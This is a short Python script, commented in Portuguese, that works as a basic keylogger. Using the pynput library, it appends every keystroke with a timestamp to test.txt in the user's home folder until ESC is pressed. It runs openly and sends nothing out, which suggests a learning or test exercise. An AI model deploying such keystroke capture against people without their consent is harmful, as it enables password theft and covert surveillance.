import os
from datetime import datetime
from pynput.keyboard import Listener, Key

# Definir caminho do arquivo
log_file = os.path.join(os.path.expanduser("~"), "test.txt")

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = str(key)

    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now()}] {char}\n")

def on_release(key):
    if key == Key.esc:  # Pressione ESC para parar
        return False

if __name__ == "__main__":
    # Cria o diretório se ele não existir
    os.makedirs(os.path.dirname(log_file), exist_ok=True)

    # Inicia o listener do teclado
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()